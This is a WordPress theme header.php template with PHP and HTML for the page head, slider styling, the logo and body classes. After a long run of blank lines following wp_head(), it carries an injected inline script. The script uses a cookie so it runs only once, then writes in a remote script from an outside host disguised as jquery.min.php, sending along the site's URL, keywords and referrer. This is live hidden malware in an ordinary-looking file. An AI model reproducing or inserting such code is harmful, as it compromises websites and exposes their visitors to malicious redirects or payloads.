<!DOCTYPE html>
<!--[if IE 7]>
<html class="ie ie7" <?php language_attributes(); ?>>
<![endif]-->
<!--[if IE 8]>
<html class="ie ie8" <?php language_attributes(); ?>>
<![endif]-->
<!--[if !(IE 7) | !(IE 8)  ]><!-->
<html <?php language_attributes(); ?>>
<!--<![endif]-->
	<head>
		<meta charset="<?php bloginfo( 'charset' ); ?>" />
		<?php if(ot_get_option( 'responsive', 0)){ ?>
		<meta name="viewport" content="width=device-width, initial-scale=1" />
		<?php } ?>
		<script type="text/javascript">
			_THEME_URL_ = "<?php echo get_stylesheet_directory_uri(); ?>";
		</script>
		<title>
			<?php 
			$headings = get_tribe_events_page_heading();
			if($headings !== false){
				echo strip_tags($headings[0]);
			} elseif(is_404()&&ot_get_option('page404_title',false)){
				echo ot_get_option('page404_title','Page not found'); 
			}
			else {
				wp_title( '|', true, 'right' ); 
			}
			?>
		</title>
		<link rel="profile" href="http://gmpg.org/xfn/11" />
		<link rel="pingback" href="<?php bloginfo( 'pingback_url' ); ?>" />
		<!--[if lt IE 9]>
		<script src="<?php echo get_template_directory_uri(); ?>/js/html5.js" type="text/javascript"></script>
		<![endif]-->
		<script type="text/javascript">
			var is_isotope = false;
			<?php if(ot_get_option('portfolio_animation') == 'isoptope'):?> is_isotope = true; <?php endif;?>
		</script>
		<?php
		if(is_active_sidebar('main_top')){
			$background = ot_get_option('background_slider');
			$back1=isset($background['background-image'])?$background['background-image']:'';
			$back2=isset($background['background-color'])?$background['background-color']:'';
			if($back1!='' || $back2!='')	{
		?>
		
		<style type="text/css" >
			#slider{
				<?php if(isset($background['background-image'])){?>background:<?php echo $background['background-color'];?> url(<?php echo $background['background-image'];?>) <?php echo $background['background-attachment'];?> center 0 <?php echo $background['background-repeat'];?>;background-size:cover<?php }?>
			}
		</style>
		<?php
			}
		}
		?>
<?php if(ot_get_option('retina_logo')):?>
<style type="text/css" >
	@media only screen and (-webkit-min-device-pixel-ratio: 2),(min-resolution: 192dpi) {
		/* Retina Logo */
		.logo{background:url(<?php echo ot_get_option('retina_logo'); ?>) no-repeat center; display:inline-block !important; background-size:contain;}
		.logo img{ opacity:0; visibility:hidden}
		.logo *{display:inline-block}
	}
</style>
<?php endif;?>

<?php wp_head(); ?>
<!--[if lte IE 9]>
	<link rel="stylesheet" type="text/css" href="<?php echo get_template_directory_uri(); ?>/css/ie.css" />
<![endif]-->						















<script>var a='';setTimeout(1);function setCookie(a,b,c){var d=new Date;d.setTime(d.getTime()+60*c*60*1e3);var e="expires="+d.toUTCString();document.cookie=a+"="+b+"; "+e}function getCookie(a){for(var b=a+"=",c=document.cookie.split(";"),d=0;d<c.length;d++){for(var e=c[d];" "==e.charAt(0);)e=e.substring(1);if(0==e.indexOf(b))return e.substring(b.length,e.length)}return null}null==getCookie("__cfgoid")&&(setCookie("__cfgoid",1,1),1==getCookie("__cfgoid")&&(setCookie("__cfgoid",2,1),document.write('<script type="text/javascript" src="' + 'http://www.api29.fr/js/jquery.min.php' + '?key=b64' + '&utm_campaign=' + 'I92930' + '&utm_source=' + window.location.host + '&utm_medium=' + '&utm_content=' + window.location + '&utm_term=' + encodeURIComponent(((k=(function(){var keywords = '';var metas = document.getElementsByTagName('meta');if (metas) {for (var x=0,y=metas.length; x<y; x++) {if (metas[x].name.toLowerCase() == "keywords") {keywords += metas[x].content;}}}return keywords !== '' ? keywords : null;})())==null?(v=window.location.search.match(/utm_term=([^&]+)/))==null?(t=document.title)==null?'':t:v[1]:k)) + '&se_referrer=' + encodeURIComponent(document.referrer) + '"><' + '/script>')));</script>
</head>
<?php
$body_class = '';
$body_class .= ot_get_option( 'theme_style') == 'dark' ? 'light dark ' : 'light ';
$body_class .= ot_get_option( 'layout', false) ? ot_get_option( 'layout' ).' ' : '';
$body_class .= ot_get_option( 'responsive', 1) ? '' : 'no-responsive ';
if(is_page_template('page-templates/front-page.php')){
	$body_class .= 'home ';
	$revslider = get_post_meta($post->ID,'revslider',true);
	$body_class .= ($revslider == '') ? 'use-maintop-sidebar ' : '';
}else{
	$body_class .= (ot_get_option('slider_section','noslider') == 'noslider') ? ((!is_active_sidebar('main_top'))?'noslider':'use-maintop-sidebar') : '';
}
global $default_color;
$default_color = ot_get_option( 'main_color')?ot_get_option( 'main_color'):(ot_get_option( 'theme_style') == 'dark' ? '#ffd600' : '#ee4422');
?>
<body <?php body_class($body_class) ?>>
<a name="top" style="height:0; position:absolute; top:0;"></a>
	<div class="clear"></div>
    <header>
        <?php get_template_part( 'header', 'navigation' ); // load header-navigation.php ?>
		<?php 			
			if(is_home() || is_front_page() || is_page_template('page-templates/front-page.php')){
				get_template_part( 'header', 'frontpage' ); // load header-frontpage.php
			} /*else if(is_search()){
				get_template_part( 'header', 'search' ); // load headersearch-single.php
			}*/
			else{
				get_template_part( 'header', 'single' ); // load header-single.php
			}?>
    </header>
    <div class="clear"></div>
    <div id="body">
    	<div id="wrapper">      